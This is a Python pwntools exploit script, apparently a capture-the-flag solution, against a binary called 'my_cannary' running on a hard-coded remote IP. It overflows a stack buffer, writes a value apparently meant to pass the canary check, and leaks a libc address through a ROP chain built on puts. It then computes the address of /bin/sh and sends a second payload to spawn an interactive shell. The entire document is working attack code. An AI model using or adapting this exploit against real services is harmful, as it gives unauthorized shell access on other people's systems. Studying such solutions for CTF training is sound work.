#!/usr/bin/python
#__author__: TaQini
from pwn import *

# p = process('./my_cannary')
# p = remote('172.21.4.12',10102)
p = remote('183.129.189.60',10013)
# context.log_level = 'debug'

elf = ELF('./my_cannary')

len = 48
buf = 0x602670
s = 0x400ad0
ss = "Now let'"

main = 0x400998 # main

# system = elf.symbols['system']
prdi = 0x0000000000400a43 # : pop rdi ; ret

payload = "".ljust(48,"A") + p64(s) + ss + p64(0)

puts = elf.symbols['puts']
puts_got = elf.got['puts']

payload += p64(prdi) + p64(puts_got) + p64(puts) + p64(main)

log.info("payload1:"+payload)

p.recvuntil("Now let's begin\n")
# gdb.attach(p)#,"b *0x400937")
p.sendline(payload)

info = p.recv(6)

log.info(info)
log.info(hex(u64(info.ljust(8,'\0'))))

libc_puts = u64(info.split()[0].ljust(8,'\0'))
puts_offset = 0x06f690 # remote
#puts_offset = 0x83cc0 #local
binsh_offset = 0x18cd57 #0x1afb84 
#binsh_offset = 0x1afb84 # local

libc_binsh = libc_puts-puts_offset+binsh_offset

log.info('libc puts addr: '+hex(libc_puts))
log.info('libc binsh addr: '+hex(libc_binsh))

payload2 = "".ljust(48,"B") + p64(s) + ss + p64(0)
# payload2 += p64(0x4008b9)  #test
payload2 += p64(prdi) + p64(libc_binsh) + p64(0x4008be) + p64(main)

log.info("payload2:"+payload2)

p.recvuntil("Now let's begin\n")
# gdb.attach(p)
p.sendline(payload2)

p.interactive()
